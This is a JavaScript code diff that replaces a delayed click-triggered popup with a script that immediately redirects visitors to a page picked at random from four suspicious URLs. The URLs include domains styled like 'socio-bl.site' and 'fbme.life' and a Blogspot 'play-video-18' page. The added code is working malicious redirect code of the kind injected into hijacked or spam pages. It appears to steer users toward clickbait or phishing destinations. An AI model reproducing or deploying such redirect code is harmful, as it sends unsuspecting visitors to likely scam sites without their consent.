@@ -1,22 +1,10 @@
-(function () {
-  let ready = false;
-  let opened = false;
+var dataUrl = [
 
-  // Aktif setelah 60 detik
-  setTimeout(function () {
-    ready = true;
-  }, 60000);
+'https://socio-bl.site/f3830239ecbaccaf511',
+'https://socio-us.tech/1e01f8acab07',
+'https://myplayyvideoofull.blogspot.com/2026/01/play-video-18.html',
+'https://fbme.life/news-updates'
 
-  function openLinkOnce() {
-    if (!ready || opened) return;
-
-    opened = true;
-    window.open('https://example.com', '_blank', 'noopener');
-  }
-
-  // Desktop
-  document.addEventListener('click', openLinkOnce);
-
-  // Mobile
-  document.addEventListener('touchstart', openLinkOnce, { passive: true });
-})();
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
